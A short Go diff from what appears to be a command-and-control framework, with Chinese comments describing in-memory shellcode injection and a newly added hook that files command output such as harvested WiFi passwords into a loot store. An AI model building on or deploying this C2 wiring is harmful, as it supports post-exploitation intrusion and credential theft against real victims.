@@ -268,6 +268,8 @@ func main() {
 	cna.ExecFunc = sendcommand.SendCommand
 	// 控制台 inject 命令分发：按客户端监听器动态生成 shellcode 并内存注入
 	sendcommand.InjectMemDispatcher = api.DispatchInject
+	// 命令回包识别：WiFi 密码等产出自动入战利品库（识别逻辑在 pkg/api，避免反向依赖）
+	command.LootIngestFunc = func(uid, output string) { api.IngestLootFromOutput(uid, output) }
 	// 订阅客户端上线事件：触发 cna beacon_initial 事件（tcp/ws/kcp/http 各协议统一入口）
 	if command.GlobalEventBus != nil {
 		go func() {
